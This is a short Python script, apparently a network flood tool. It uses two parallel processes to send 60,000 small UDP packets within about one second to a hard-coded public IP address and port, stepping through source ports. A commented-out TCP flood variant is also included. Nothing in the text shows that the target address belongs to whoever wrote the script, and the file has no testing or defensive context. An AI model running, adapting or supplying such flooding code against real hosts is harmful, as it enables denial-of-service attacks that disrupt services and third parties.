import socket
import random
import time
import multiprocessing

#def generate_random_port():
#    return random.randint(1024, 65535)

def udp_flood(dst_ip, dst_port, packet_count, send_time,begin_port):
    gap = send_time / packet_count
    port=begin_port
    for _ in range(packet_count):
        #src port range(1024,61024)
        src_port = port
        #generate_random_port()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('', src_port))  
        sock.sendto(b"X" * 36, (dst_ip, dst_port))
        print(f"Sent packet from port {src_port} to {dst_ip}:{dst_port}")
        sock.close()  
        time.sleep(gap)
        port=port+1

'''
def tcp_flood(dst_ip, dst_port, packet_count, send_time):
    gap = send_time / packet_count
    for _ in range(packet_count):
        src_port = generate_random_port()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        sock.bind(('', src_port))  
        sock.connect((dst_ip, dst_port))  
        sock.send(b"X" * 36)
        print(f"Sent packet from port {src_port} to {dst_ip}:{dst_port}")
        sock.close()  
        time.sleep(gap)
'''
if __name__ == "__main__":
    dst_ip = "47.96.121.125"  
    dst_port = 11111  
    packet_count = 60000  
    send_time = 1  

    process_count = 2
    processes = []
    for _ in range(process_count):
        p = multiprocessing.Process(target=udp_flood, args=(dst_ip, dst_port, packet_count // process_count, send_time,1024))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()
